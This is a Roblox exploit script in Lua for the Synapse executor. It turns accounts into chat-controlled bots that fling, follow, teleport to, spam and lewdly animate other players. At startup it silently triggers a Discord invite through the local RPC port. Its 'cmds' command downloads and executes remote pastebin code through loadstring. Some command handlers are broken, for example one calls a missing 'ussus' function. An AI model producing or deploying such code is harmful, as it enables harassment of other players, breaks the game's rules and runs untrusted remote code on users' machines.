if not game:IsLoaded() then
    game.Loaded:Wait()
end

if not syn then print("Not using synapse!") return end
print("Running! v1.4.2")

--variables
    local JobID
    local GameID
    local isfollow = false
    local isbhop = false
    local isadvert = false
    local lp = game.Players.LocalPlayer
    local master = _G.Name
    local prefix = _G.Prefix
    local Admins = _G.Admins
    local MBot = _G.PriorityBot
    local isbang
    local bang

    local http = game:GetService('HttpService') 
    local req = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or getgenv().request or request
    if req then
            req({
                Url = 'http://127.0.0.1:6463/rpc?v=1',
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json',
                    Origin = 'https://discord.com'
                },
                Body = http:JSONEncode({
                    cmd = 'INVITE_BROWSER',
                    nonce = http:GenerateGUID(false),
                    args = {code = 'yyyV2D5JNT'}
                })
            })
    end


--Commands
    local commands = {

        sus = function(player)
            for i,v in pairs(game.Players:GetPlayers())do
                if v.Name == player and lp.Name == MBot then
                    if not lp.Character:FindFirstChildOfClass('Humanoid').RigType == Enum.HumanoidRigType.R15 then
                        local bangAnim = Instance.new("Animation")
                        bangAnim.AnimationId = "rbxassetid://148840371"
                        bang = lp.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(bangAnim)
                        bang:Play(.1, 1, 1)
                        bang:AdjustSpeed(3)
                        local bangOffet = CFrame.new(0, 0, 1.1)
                        while isbang do
                            wait()
                            pcall(function()
                                local otherRoot = v.Character.UpperTorso or v.Character.Torso
                                lp.Character.HumanoidRootPart.CFrame = otherRoot.CFrame * bangOffet
                            end)
                        end
                    end
                end
            end
        end,

        unsus = function()
            isbang = false
            bang:Stop()
        end,
        nofling = function()
            if lp.Name ~= master then
                local function NoclipLoop()
                    if player.Character ~= nil then
                        for _, child in pairs(player.Character:GetDescendants()) do
                            if child:IsA("BasePart") and child.CanCollide == true and child.Name ~= "aaaaaaaaaaaaaaaaaaaaaa" then
                                child.CanCollide = false
                            end
                        end
                    end
                end
                Noclipping = game:GetService('RunService').Stepped:Connect(NoclipLoop)
            end
        end,
        goto = function(player)
            local player2
            for i,v in pairs(game.Players:GetPlayers()) do
                if string.lower(player) == string.lower(string.sub(v.Name,0,#player)) and lp.Name ~= master then
                    player2 = v
                end
            end
            lp.Character.HumanoidRootPart.CFrame = player2.Character.HumanoidRootPart.CFrame
        end,

        advert = function(said,speaker)
            if isadvert then
                if lp.Name ~= master then 
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Use -un advert before adverting something else! The bot(s) will now stop repeating the last quote", "All")
                    isadvert = false
                end
            end
            isadvert = true
            if lp.Name ~= master then
                while isadvert do
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(said, "All")
                    wait(5)
                end
            end
        end,
        unadvert = function(speaker)
            isadvert = false
        end,
        wsa = function(number,speaker)
            print(number)
            if lp.Name ~= master then
                lp.Character.Humanoid.WalkSpeed = number
            else
                print("u are master")
            end
        end,
        follow = function(player,speaker)
            if isfollow == true then 
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Use -unfollow before trying to follow someone else! The bots will now stop following...", "All")
                isfollow = false
            end
            print(player)
            isfollow = true
            
            while isfollow do
                wait(0.1)
                for i,v in pairs(game.Players:GetPlayers()) do
                    if string.lower(player) == string.lower(string.sub(v.Name,0,#player)) and lp.Name ~= master then
                        if game:GetService("Players").LocalPlayer.Character and game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
                            game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):MoveTo(v.Character.HumanoidRootPart.Position)
                        end
                    end
                end
            end
        end,
        unfollow = function(player,speaker)
            print("un")
            isfollow = false
        end,
        bhop = function(speaker)
            isbhop = true
            while isbhop do
                wait(0.1)
                if lp.Name ~= master then
                    lp.Character:FindFirstChildOfClass("Humanoid").Jump = true
                end
            end
        end,
        unbhop = function(speaker)
            isbhop = false
        end,
        bringbot = function(bot,speaker)
            if lp.Name == bot  then
                lp.Character.HumanoidRootPart.CFrame = game.Players[speaker].Character.HumanoidRootPart.CFrame
            elseif bot == "all" then
                if lp.Name ~= master then
                    lp.Character.HumanoidRootPart.CFrame = game.Players[speaker].Character.HumanoidRootPart.CFrame
                end
            elseif bot == "das" then
                if lp.Name == "dasdasdaslol"  then
                    lp.Character.HumanoidRootPart.CFrame = game.Players[speaker].Character.HumanoidRootPart.CFrame
                end
            end
        end,
        killbot = function(bot,speaker)
            if lp.Name == bot then
                lp.Character.Humanoid.Health = 0
            elseif bot == "das" then
                if lp.Name == "dasdasdaslol"  then
                    lp.Character.Humanoid.Health = 0            
                end
            end
        end,
        resetbots = function(speaker)
            if lp.Name ~= master then
                lp.Character.Humanoid.Health = 0
            end
        end,
        say = function(said,speaker)
            if lp.Name ~= master then
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(said, "All")
            end
        end,
        quit = function(speaker)
            if lp.Name ~= master then
                lp:Kick("rejoin")
            end
        end,
        cmds = function(speaker)
            loadstring(game:HttpGet('https://pastebin.com/raw/rVm4TgBB'))();
            if lp.Name ~= master then
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("wsa [number], follow [player], -unfollow [player], -bhop, -un bhop, -bring bot [bot username], -kill bot [bot username], -reset bots, -bot say [quote], -quit -fling [Player Name (Doesn't have to be full username)]", "All")
            end
        end,
        fling = function(plrr,speaker)
            for i,v in pairs(game.Players:GetPlayers()) do
                if string.lower(plrr) == string.lower(string.sub(v.Name,0,#plrr)) and lp.Name ~= master and lp.Name == MBot then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("flinging", "All")
                    local Target = v
                    local Thrust = Instance.new('BodyThrust', lp.Character.HumanoidRootPart)
                    Thrust.Force = Vector3.new(9999,9999,9999)
                    Thrust.Name = "YeetForce"
                    repeat
                        lp.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame
                        Thrust.Location = Target.Character.HumanoidRootPart.Position
                        game:FindService("RunService").Heartbeat:wait()
                    until not Target.Character:FindFirstChild("Head") or lp.Character.Humanoid.Health == 0
                    Thrust:Destroy()
                end
            end
        end,
        paid = function()
            setclipboard("https://www.roblox.com")
        end
    }
--Chat Intake
    local takeAdmins = true
    local rollPlayerChat = function()
        for _,plrr in pairs(game.Players:GetPlayers()) do
            plrr.Chatted:Connect(function(msg)
                for i,v in pairs(Admins) do
                    if plrr.Name == v and takeAdmins then
                        local who = plrr.Name or v
                        if string.sub(msg, 0, 4)== prefix.."wsa" then
                            print("workedwsa")
                            local num = string.sub(msg, 6)
                            commands.wsa(num,who)
                        elseif string.sub(msg, 0, 7)==prefix.."follow" then
                            print("workedfollow")
                            local asdf=string.sub(msg, 9)
                            commands.follow(asdf,who)
                        elseif string.sub(msg, 0, 9)==prefix.."unfollow" then
                            print("workedun")
                            commands.unfollow(who)
                        elseif string.sub(msg, 0, 5)==prefix.."bhop" then
                            print("workedbhop")
                            commands.bhop(who)
                        elseif string.sub(msg, 0, 8)==prefix.."un bhop" then
                            print("workedunbhop")
                            commands.unbhop(who)
                        elseif string.sub(msg, 0, 10)==prefix.."bring bot" then
                            local asdf=string.sub(msg, 12)
                            print("workedun")
                            commands.bringbot(asdf,who)
                        elseif string.sub(msg, 0, 9)==prefix.."kill bot" then
                            local asdf=string.sub(msg, 11)
                            print("workedun")
                            commands.killbot(asdf,who)
                        elseif string.sub(msg, 0, 11)==prefix.."reset bots" then
                            print("workedun")
                            commands.resetbots(who)
                        elseif string.sub(msg, 0, 8)==prefix.."bot say" then
                            local asdf=string.sub(msg, 10)
                            commands.say(asdf,who)
                        elseif string.sub(msg, 0, 5)==prefix.."cmds" then
                            commands.cmds(who)
                        elseif string.sub(msg, 0, 6)==prefix.."fling" then
                            local asdf=string.sub(msg, 8)
                            print(asdf)
                            commands.fling(asdf,who)
                        elseif string.sub(msg, 0, 7)==prefix.."advert" then
                            print("advert")
                            local asdf=string.sub(msg, 9)
                            print(asdf)
                            commands.advert(asdf,who)
                        elseif string.sub(msg, 0, 10)==prefix.."un advert" then
                            print("un advert")
                            commands.unadvert(who)
                        elseif string.sub(msg, 0, 6)==prefix.."sus" then
                            local asdf=string.sub(msg, 6)
                            print(asdf)
                            commands.sus(asdf,who)
                        elseif string.sub(msg, 0, 6)==prefix.."no sus" then
                            local asdf=string.sub(msg, 8)
                            print(asdf)
                            commands.ussus(asdf,who)
                        elseif string.sub(msg, 0, 6)==prefix.."go to" then
                            local asdf=string.sub(msg, 8)
                            print(asdf)
                            commands.goto(asdf,who)
                        end
                    elseif takeAdmins == false then
                        break
                    end
                end
            end)
        end
    end
    local PlayerChatStop = function()
        takeAdmins = false
        wait(1)
        takeAdmins = true
        rollPlayerChat()
    end    

    rollPlayerChat()

    game.Players.PlayerAdded:Connect(function(plrr)
        for i,v in pairs(Admins) do
            if plrr.Name == v then
                PlayerChatStop()
            end
        end
    end)
    game.Players:WaitForChild(master).Chatted:Connect(function(msg)
        print("chatted")
        local who = master
        if string.sub(msg, 0, 4)== prefix.."wsa" then
            print("workedwsa")
            local num = string.sub(msg, 6)
            commands.wsa(num,who)
        elseif string.sub(msg, 0, 7)==prefix.."follow" then
            print("workedfollow")
            local asdf=string.sub(msg, 9)
            commands.follow(asdf,who)
        elseif string.sub(msg, 0, 9)==prefix.."unfollow" then
            print("workedun")
            commands.unfollow(who)
        elseif string.sub(msg, 0, 5)==prefix.."bhop" then
            print("workedbhop")
            commands.bhop(who)
        elseif string.sub(msg, 0, 8)==prefix.."un bhop" then
            print("workedunbhop")
            commands.unbhop(who)
        elseif string.sub(msg, 0, 10)==prefix.."bring bot" then
            local asdf=string.sub(msg, 12)
            print("workedun")
            commands.bringbot(asdf,who)
        elseif string.sub(msg, 0, 9)==prefix.."kill bot" then
            local asdf=string.sub(msg, 11)
            print("workedun")
            commands.killbot(asdf,who)
        elseif string.sub(msg, 0, 11)==prefix.."reset bots" then
            print("workedun")
            commands.resetbots(who)
        elseif string.sub(msg, 0, 8)==prefix.."bot say" then
            local asdf=string.sub(msg, 10)
            commands.say(asdf,who)
        elseif string.sub(msg, 0, 5)==prefix.."quit" then
            commands.quit(who)
        elseif string.sub(msg, 0, 5)==prefix.."cmds" then
            commands.cmds(who)
        elseif string.sub(msg, 0, 6)==prefix.."fling" then
            local asdf=string.sub(msg, 8)
            print(asdf)
            commands.fling(asdf,who)
        elseif string.sub(msg, 0, 7)==prefix.."advert" then
            print("advert")
            local asdf=string.sub(msg, 9)
            print(asdf)
            commands.advert(asdf,who)
        elseif string.sub(msg, 0, 10)==prefix.."un advert" then
            print("un advert")
            commands.unadvert(who)
        elseif string.sub(msg, 0, 6)==prefix.."go to" then
            local asdf=string.sub(msg, 8)
            print(asdf)
            commands.goto(asdf,who)
        elseif string.sub(msg, 0, 4)==prefix.."sus" then
            local asdf=string.sub(msg, 6)
            print(asdf)
            commands.sus(asdf,who)
        elseif string.sub(msg, 0, 7)==prefix.."no sus" then
            local asdf=string.sub(msg, 8)
            print(asdf)
            commands.ussus(asdf,who)
        elseif string.sub(msg, 0, 8)==prefix.."nofling" then
            local asdf=string.sub(msg, 10)
            print(asdf)
            commands.fling(asdf,who)
        end
    end)

wait(4)
